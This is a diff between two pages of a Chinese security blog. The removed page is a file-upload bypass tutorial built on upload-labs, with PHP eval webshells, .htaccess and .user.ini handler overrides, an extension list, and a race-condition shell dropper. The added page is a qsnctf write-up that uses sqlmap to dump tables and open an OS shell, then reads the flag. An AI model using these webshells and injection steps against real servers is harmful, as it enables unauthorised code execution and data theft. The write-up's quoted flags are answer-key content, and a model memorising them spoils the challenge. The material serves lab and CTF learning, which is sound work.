@@ -6,27 +6,24 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="https://blog.zyp0422.mom">
-  <title>文件上传 | zhou</title>
+  <title>[qsnctf]文章管理系统 | zhou</title>
   <meta name="generator" content="hexo-theme-yilia-plus">
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   
-  <meta name="description" content="本地客户端验证原理通过JavaScript验证上传的文件类型">
+  <meta name="description" content="题目考点：SQL注入、命令执行">
 <meta property="og:type" content="article">
-<meta property="og:title" content="文件上传">
-<meta property="og:url" content="https://blog.zyp0422.mom/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/index.html">
+<meta property="og:title" content="[qsnctf]文章管理系统">
+<meta property="og:url" content="https://blog.zyp0422.mom/qsnctf%E6%96%87%E7%AB%A0%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/index.html">
 <meta property="og:site_name" content="zhou">
-<meta property="og:description" content="本地客户端验证原理通过JavaScript验证上传的文件类型">
+<meta property="og:description" content="题目考点：SQL注入、命令执行">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://blog.zyp0422.mom/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/1.png">
-<meta property="og:image" content="https://blog.zyp0422.mom/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/2.png">
-<meta property="og:image" content="https://blog.zyp0422.mom/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/3.png">
-<meta property="article:published_time" content="2024-04-01T02:33:36.000Z">
-<meta property="article:modified_time" content="2024-09-03T12:55:54.358Z">
+<meta property="og:image" content="https://blog.zyp0422.mom/qsnctf%E6%96%87%E7%AB%A0%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/1.png">
+<meta property="article:published_time" content="2024-04-02T02:16:42.000Z">
+<meta property="article:modified_time" content="2024-05-30T13:08:22.437Z">
 <meta property="article:author" content="zhoupeng">
-<meta property="article:tag" content="web">
-<meta property="article:tag" content="文件上传">
+<meta property="article:tag" content="SQL注入">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://blog.zyp0422.mom/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/1.png">
+<meta name="twitter:image" content="https://blog.zyp0422.mom/qsnctf%E6%96%87%E7%AB%A0%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/1.png">
   
     <link rel="alternative" href="/atom.xml" title="zhou" type="application/atom+xml">
   
@@ -336,14 +333,14 @@
               class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-文件上传" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-qsnctf文章管理系统" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
   
   
     <h1 class="article-title" itemprop="name">
-      文件上传
+      [qsnctf]文章管理系统
     </h1>
   
 
@@ -355,8 +352,8 @@
               <i class="icon-smile icon"></i> 阅读数：<span id="busuanzi_value_page_pv"></span>次
         </span>
 
-<a href="/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" class="archive-article-date">
-        <time datetime="2024-04-01T02:33:36.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2024-04-01</time>
+<a href="/qsnctf%E6%96%87%E7%AB%A0%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/" class="archive-article-date">
+        <time datetime="2024-04-02T02:16:42.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2024-04-02</time>
 </a>
 
   
@@ -369,7 +366,7 @@
       <!-- 百度字体平台:http://fontstore.baidu.com/static/editor/index.html -->
       <i class="icon-statistics"></i>
       <span class="post-meta-item-text"> 字数统计:</span>
-      <span class="post-count">2k字</span>
+      <span class="post-count">311字</span>
     </span>
   </span>
 
@@ -378,7 +375,7 @@
     <span class="post-meta-item-icon">
       <i class="icon-book icon"></i>
       <span class="post-meta-item-text"> 阅读时长≈</span>
-      <span class="post-count">8分</span>
+      <span class="post-count">1分</span>
     </span>
   </span>
 </div>
@@ -391,81 +388,29 @@
  
 
 	
-		<h3 id="本地客户端验证"><a href="#本地客户端验证" class="headerlink" title="本地客户端验证"></a>本地客户端验证</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>通过JavaScript验证上传的文件类型<span id="more"></span></p>
-<h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><p>通过浏览器开发者中禁用JS，或先上传允许的文件，然后再通过burp或者yakit抓包修改文件后缀即可</p>
-<h4 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h4><p>upload-labs的第一关</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">function checkFile() &#123;</span><br><span class="line">    var file = document.getElementsByName(<span class="string">&#x27;upload_file&#x27;</span>)[<span class="number">0</span>].value;</span><br><span class="line">    <span class="keyword">if</span> (file == null || file == <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">        alert(<span class="string">&quot;请选择要上传的文件!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> false;</span><br><span class="line">    &#125;</span><br><span class="line">    //定义允许上传的文件类型</span><br><span class="line">    var allow_ext = <span class="string">&quot;.jpg|.png|.gif&quot;</span>;</span><br><span class="line">    //提取上传文件的类型</span><br><span class="line">    var ext_name = file.substring(file.lastIndexOf(<span class="string">&quot;.&quot;</span>));</span><br><span class="line">    //判断上传文件类型是否允许上传</span><br><span class="line">    <span class="keyword">if</span> (allow_ext.indexOf(ext_name + <span class="string">&quot;|&quot;</span>) == -<span class="number">1</span>) &#123;</span><br><span class="line">        var errMsg = <span class="string">&quot;该文件不允许上传，请上传&quot;</span> + allow_ext + <span class="string">&quot;类型的文件,当前文件类型为：&quot;</span> + ext_name;</span><br><span class="line">        alert(errMsg);</span><br><span class="line">        <span class="keyword">return</span> false;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+		<h3 id="题目考点：SQL注入、命令执行"><a href="#题目考点：SQL注入、命令执行" class="headerlink" title="题目考点：SQL注入、命令执行"></a><strong>题目考点：</strong>SQL注入、命令执行</h3><span id="more"></span>
 
-<p>可以向分析一下源码，开启了JavaScript验证，只允许上传jpg、png、gif后缀文件这时候我们可以以此点击F12–F1，打开浏览器的开发者模式（这里使用的是火狐浏览器），将下图圈中的禁用JavaScript开启后就可以上传我们的一句话木马</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>不废话，上题目</p>
+<p><img src="/qsnctf%E6%96%87%E7%AB%A0%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/1.png"></p>
+<p>点击下一篇，观察到payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challenge.qsnctf.com:30280/?id=1</span><br></pre></td></tr></table></figure>
 
-<p><img src="/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/1.png"></p>
-<h3 id="服务器端校验"><a href="#服务器端校验" class="headerlink" title="服务器端校验"></a>服务器端校验</h3><h4 id="content-type字段校验"><a href="#content-type字段校验" class="headerlink" title="content-type字段校验"></a>content-type字段校验</h4><h5 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h5><p>在html页面中会显示能够传输的文件MIME或文件类型，或者在上传了一个错误文件类型后，会弹窗告诉你该文件无法上传并且显示允许上传的文件类型</p>
-<h5 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h5><ul>
-<li>正常上传允许上传的文件类型，然后通过抓包软件修改文件后缀</li>
-<li>正常上传文件，同时抓包修改文件MIME</li>
-</ul>
-<p><em><strong>一般允许上传的MIME类型</strong></em></p>
-<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">拓展名		  <span class="selector-tag">MIME</span>类型</span><br><span class="line"><span class="selector-tag">gif</span>			<span class="selector-tag">image</span>/<span class="selector-tag">gif</span></span><br><span class="line"><span class="selector-tag">png</span>			<span class="selector-tag">image</span>/<span class="selector-tag">png</span></span><br><span class="line"><span class="selector-tag">jpg</span>			<span class="selector-tag">image</span>/<span class="selector-tag">jpeg</span></span><br><span class="line"><span class="selector-tag">js</span>			<span class="selector-tag">text</span>/<span class="selector-tag">javascript</span></span><br><span class="line"><span class="selector-tag">htm</span>			<span class="selector-tag">text</span>/<span class="selector-tag">html</span></span><br><span class="line"><span class="selector-tag">html</span>		<span class="selector-tag">text</span>/<span class="selector-tag">html</span></span><br></pre></td></tr></table></figure>
+<p>如上?id&#x3D;1，疑似注入点，可能存在注入点，于是使用sqlmap跑一下，发现一个flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sqlmap --url=&quot;http://challenge.qsnctf.com:30280/?id=1&quot; -D word -T articles   --dump --batch</span><br><span class="line"></span><br><span class="line">qsnctf&#123;sql+so+easy!!!!&#125;</span><br></pre></td></tr></table></figure>
 
-<h5 id="例题-1"><a href="#例题-1" class="headerlink" title="例题"></a>例题</h5><p>同理直接查看源码</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/jpeg&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/png&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/gif&#x27;</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]            </span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;文件类型不正确，请重新上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH.<span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>可以看到if语句中只允许上传jpg、png、gif三种类型的文件，会对其MIME类型进行检查</p>
-<p>上传php文件的时候开启拦截将type改为允许的类型</p>
-<p><img src="/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/2.png"></p>
-<p><img src="/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/3.png"></p>
-<h4 id="黑名单校验"><a href="#黑名单校验" class="headerlink" title="黑名单校验"></a>黑名单校验</h4><h5 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h5><p>定义一个黑名单，如果上传文件的后缀名在黑名单中就不允许上传</p>
-<h5 id="利用一"><a href="#利用一" class="headerlink" title="利用一"></a>利用一</h5><p>可以使用一些不在黑名单中但是可以被浏览器解析的后缀名</p>
-<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">php</span> <span class="selector-tag">php3</span> <span class="selector-tag">php4</span> <span class="selector-tag">php5</span> <span class="selector-tag">php7</span></span><br><span class="line"><span class="selector-tag">pht</span> <span class="selector-tag">phtml</span> <span class="selector-tag">phar</span> <span class="selector-tag">phps</span></span><br><span class="line"><span class="selector-tag">Asp</span> <span class="selector-tag">aspx</span> <span class="selector-tag">cer</span> <span class="selector-tag">cdx</span> <span class="selector-tag">asa</span> <span class="selector-tag">asax</span></span><br><span class="line"><span class="selector-tag">jsp</span> <span class="selector-tag">jspa</span> <span class="selector-tag">jspx</span></span><br></pre></td></tr></table></figure>
-
-<p>除了上面的方法，还可以使用大小写绕过：PhP&#x2F;pHP…（这只是例子，并不绝对，具体看具体题目）</p>
-<p>注意：win下会吞掉一些文件后缀名后面的空格或点，，这时候需要使用bp抓包加上空格或点</p>
-<h5 id="利用二"><a href="#利用二" class="headerlink" title="利用二"></a>利用二</h5><p>配合apache上的.htaccess文件（分布式配置文件，提供针对目录改变配置的方法，在特定的文档目录放置一个包含一个或多个指令的文件）</p>
-<p>传入文件：.htaccess，文件类型为所有类型</p>
-<p>内容为</p>
-<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">AddType</span> <span class="selector-tag">application</span>/<span class="selector-tag">x-httpd-php</span> <span class="selector-class">.jpg</span></span><br></pre></td></tr></table></figure>
-
-<p>或</p>
-<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="selector-tag">FilesMatch</span> &quot;<span class="selector-tag">ma</span><span class="selector-class">.jpg</span>&quot;&gt;</span><br><span class="line"><span class="selector-tag">SetHandler</span> <span class="selector-tag">application</span>/<span class="selector-tag">x-httpd-php</span></span><br><span class="line">&lt;/<span class="selector-tag">FilesMatch</span>&gt;</span><br></pre></td></tr></table></figure>
-
-<p>这时候会把所有jpg当成php代码执行，当然如果把.jpg或ma.jpg换成别的文件，就会把你指定的那个文件类型当成php代码执行，这时候如果我们文件里放入的是一句话木马的话，我们就可以通过蚁剑连接</p>
-<p>一句话木马</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<h6 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h6><p>先看源码</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.php1&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.pHp1&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.ini&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//收尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件不允许上传!&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>黑名单内容多，基本上把利用一中的后缀都过滤了，这是我们就可以上传.htaccess文件</p>
-<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="selector-tag">FilesMatch</span> &quot;<span class="selector-tag">shell</span><span class="selector-class">.jpg</span>&quot;&gt;</span><br><span class="line"><span class="selector-tag">SetHandler</span> <span class="selector-tag">application</span>/<span class="selector-tag">x-httpd-php</span></span><br><span class="line">&lt;/<span class="selector-tag">FilesMatch</span>&gt;</span><br></pre></td></tr></table></figure>
-
-<p>再上传一个shell.jpg文件内容为一句话木马</p>
-<h5 id="利用三"><a href="#利用三" class="headerlink" title="利用三"></a>利用三</h5><p>与利用二类似，不过这里上传的文件是.user.ini文件，文件内容是</p>
-<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">auto_append_file</span>=<span class="selector-tag">shell</span><span class="selector-class">.jpg</span></span><br></pre></td></tr></table></figure>
-
-<p>这会把我们上传的jpg文件作为php代码解析，当然不一定要jpg，也可以是png挥着gif</p>
-<p><code>.user.ini</code> 文件是一种在 PHP 环境下用于配置目录级别设置的配置文件。可以通过它来覆盖某些 PHP 配置选项，如 <code>upload_max_filesize</code>、<code>post_max_size</code>、<code>file_uploads</code> 等参数。利用 <code>.user.ini</code> 文件进行文件上传主要依赖于对这些配置参数的修改来达到绕过服务器默认限制或开启文件上传功能的目的。</p>
-<p>同理在上传一个文件shell.jpg文件的一句话木马</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<h5 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a>%00截断</h5><p>这种情况大多数出现在老版本里面，现在已经不怎么出现了</p>
-<p>0x00是十六进制的表示方式，ascil码为0的字符，在有些函数处理时候会被当做结束符</p>
-<h5 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h5><p>将文件改成例如pphphp（这只是一个例子），是可以绕过黑名单检测的</p>
-<h4 id="白名单检验"><a href="#白名单检验" class="headerlink" title="白名单检验"></a>白名单检验</h4><h5 id="配合apache解析缺陷"><a href="#配合apache解析缺陷" class="headerlink" title="配合apache解析缺陷"></a>配合apache解析缺陷</h5><p>apache读到不能识别的比如：test.php.bak，bak不能识别，会往前识别php，将文件作为php文件执行，从而执行我们的一句话木马</p>
-<h5 id="Magic-Header检查"><a href="#Magic-Header检查" class="headerlink" title="Magic Header检查"></a>Magic Header检查</h5><p>文件内容检测，有些会检查文件内容是否符合文件头信息，这时候就需要修改文件头信息</p>
+<p>提交提示错误，且题目说了存在一个假的flag，要我们用命令执行</p>
+<p>sqlmap中的–os-shell原理</p>
+<p>在使用sqlmap进行渗透测试时，–os-shell选项允许用户在目标系统上获取一个交互式shell。这个功能背后的原理是通过sqlmap利用SQL注入漏洞在数据库中注入特定的SQL命令，这些命令可以执行系统命令并将输出返回到sqlmap。</p>
 <ul>
-<li>在PHP文件开始部分添加GIF89a</li>
-<li>GIF89a–&gt;47494638</li>
+<li>以下是使用–os-shell时可能的步骤：<ul>
+<li>检测目标是否有注入漏洞。</li>
+<li>利用检测到的漏洞获取数据库访问权限。</li>
+<li>上传一个包含系统命令执行功能的脚本到目标服务器。</li>
+<li>执行脚本以获取交互式shell。</li>
 </ul>
-<p>在我们一句话木马前面加上一个GIF89a是不会影响一句话木马执行的</p>
-<h5 id="竞争上传"><a href="#竞争上传" class="headerlink" title="竞争上传"></a>竞争上传</h5><p>文件上传后先保留在服务器，检查后不合法再删掉</p>
-<p>利用：其中要考虑的点是会删除我们当前上传的不合规的文件，但是我们刚上传的文件并不会被立刻删除，所以我们可以利用这一点，让我们刚上传的文件再生成一个文件即可，系统并不会删除自动生成的文件</p>
-<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?<span class="selector-tag">php</span></span><br><span class="line">$<span class="selector-tag">file</span> = &#x27;<span class="selector-tag">web</span><span class="selector-class">.php</span>&#x27;;</span><br><span class="line">$<span class="selector-tag">shell</span> = &#x27;&lt;?<span class="selector-tag">php</span> <span class="selector-tag">eval</span>($_POST[<span class="string">&quot;cmd&quot;</span>])?&gt;&#x27;;</span><br><span class="line"><span class="selector-tag">file_put_contets</span>($file,$shell);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>这是后我们访问完刚上传的文件时就会触发，自动生成一句话木马文件</p>
-<p>upload-labs可以看这个文章<a target="_blank" rel="noopener" href="https://www.yuque.com/hxfqg9/web/gcqapk">upload-labs (yuque.com)</a></p>
-<p>当然除了上面的内容，可能不全，如果后续有新的会补充</p>
-
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> sqlmap --url=&quot;http://challenge.qsnctf.com:30280/?id=1&quot; --os-shell </span><br><span class="line"></span><br><span class="line">find / -name &quot;flag&quot;</span><br><span class="line"></span><br><span class="line">发现存在/flag目录</span><br><span class="line"></span><br><span class="line"> cat /flag 获得flag</span><br><span class="line"></span><br><span class="line"> qsnctf&#123;d6abcfbfcc95467a95acec7a9f5b0f03&#125;</span><br></pre></td></tr></table></figure>
 	
 
 
@@ -503,7 +448,7 @@
         </li>
         <li>
           <strong>本文链接：</strong>
-          <a href="https://blog.zyp0422.mom/文件上传/" title="文件上传" target="_blank">https://blog.zyp0422.mom/文件上传/</a>
+          <a href="https://blog.zyp0422.mom/qsnctf文章管理系统/" title="[qsnctf]文章管理系统" target="_blank">https://blog.zyp0422.mom/qsnctf文章管理系统/</a>
         </li>
         
         <li>
@@ -525,11 +470,7 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">web</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">文件上传</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">SQL注入</a>
         		</li>
       		
 		</ul>
@@ -541,7 +482,7 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="/categories/web//" class="article-tag-list-link color4">web</a>
+        			<a href="/categories/CTFwp//" class="article-tag-list-link color1">CTFwp</a>
         		</li>
       		
 		</ul>
@@ -596,7 +537,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
